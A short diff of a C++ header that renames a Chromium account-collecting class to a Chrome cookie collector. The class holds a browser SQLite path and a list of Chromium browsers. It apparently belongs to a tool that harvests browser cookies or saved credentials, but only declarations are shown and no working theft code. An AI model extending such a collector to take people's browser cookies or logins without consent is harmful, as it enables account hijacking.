@@ -23,17 +23,17 @@
 
 
 
-class EXPORT_F ChromiumParser : public ICollector<AccountData>
+class EXPORT_F ChromeCookiesParser : public ICollector<CookieData>
 {
 public:
-	explicit ChromiumParser()
+	explicit ChromeCookiesParser()
 		
 	{
 	}
 
-	~ChromiumParser() override;
+	~ChromeCookiesParser() override;
 
-	List<AccountData> collect_data() override;
+	List<CookieData> collect_data() override;
 	
 private:
 
@@ -43,7 +43,7 @@ private:
 	char* m_pbOutput = nullptr;
 	
 	String m_chrome_sqlite_path;
-	List<AccountData> m_collected_data;
+	List<CookieData> m_collected_data;
 	
 	const List<String> m_chromium_list {
 		
